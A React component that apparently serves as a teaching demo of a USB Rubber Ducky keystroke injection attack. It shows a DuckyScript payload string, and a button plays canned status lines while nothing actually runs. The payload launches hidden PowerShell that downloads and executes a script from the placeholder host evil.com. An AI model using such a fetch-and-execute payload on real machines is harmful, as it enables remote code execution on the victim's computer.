import { useState } from "react";
import TerminalBox from "./TerminalBox";
import { TerminalSquare, Code, Play } from "lucide-react";

export default function DuckySimulator() {
  const [run, setRun] = useState(false);

  const script = `DELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -w hidden\nENTER\nDELAY 800\nSTRING IEX(New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')\nENTER`;

  const execution = [
    "Opening Run dialog...",
    "Typing command...",
    "Launching PowerShell...",
    "Downloading payload...",
    "Executing script...",
    "Establishing connection...",
    "Attack completed ✔"
  ];

  return (
    <div className="bg-[var(--bg-surface)] rounded-3xl border border-[var(--border)] shadow-2xl p-8 animate-in fade-in slide-in-from-bottom-4 mt-8">
      <div className="flex items-center gap-3 border-b border-[var(--border)] pb-4 mb-6">
          <TerminalSquare className="text-orange-500" size={20} />
          <h2 className="text-sm font-black uppercase text-[var(--text-primary)] tracking-widest select-none">Keystroke Injection Attack (USB Rubber Ducky)</h2>
      </div>

      <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
        {/* SCRIPT PANEL */}
        <div className="bg-[#030712] rounded-2xl border border-white/5 p-6 flex flex-col shadow-inner">
          <h3 className="text-[10px] font-black uppercase text-zinc-400 tracking-widest mb-4 flex items-center gap-2 select-none">
            <Code size={14} className="text-cyan-400"/> DuckyScript Payload
          </h3>
          <pre className="text-xs text-cyan-400 font-mono flex-1 whitespace-pre-wrap break-all leading-relaxed">{script}</pre>
        </div>

        {/* EXECUTION PANEL */}
        <div className="flex flex-col gap-4">
          <div className="bg-[#030712] rounded-2xl border border-white/5 p-6 flex-1 relative overflow-hidden shadow-inner min-h-[200px]">
            <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-orange-500 to-red-500"></div>
            <h3 className="text-[10px] font-black uppercase text-zinc-400 tracking-widest mb-4 flex items-center gap-2 select-none">
                <TerminalSquare size={14} className="text-emerald-400"/> Simulated Execution
            </h3>
            <div className="font-mono text-xs text-emerald-400">
              {run ? (
                <TerminalBox lines={execution} />
              ) : (
                <p className="text-zinc-500 italic">// Click simulate to deploy payload...</p>
              )}
            </div>
          </div>

          <button 
            className="w-full bg-orange-600 hover:bg-orange-500 text-white py-4 rounded-xl font-black uppercase text-xs tracking-widest transition-all shadow-lg shadow-orange-600/30 hover:shadow-orange-500/50 flex items-center justify-center gap-2 cursor-pointer" 
            style={{ color: '#ffffff' }}
            onClick={() => setRun(true)}
          >
            <Play size={16}/> Simulate Attack (3s)
          </button>
        </div>
      </div>
    </div>
  );
}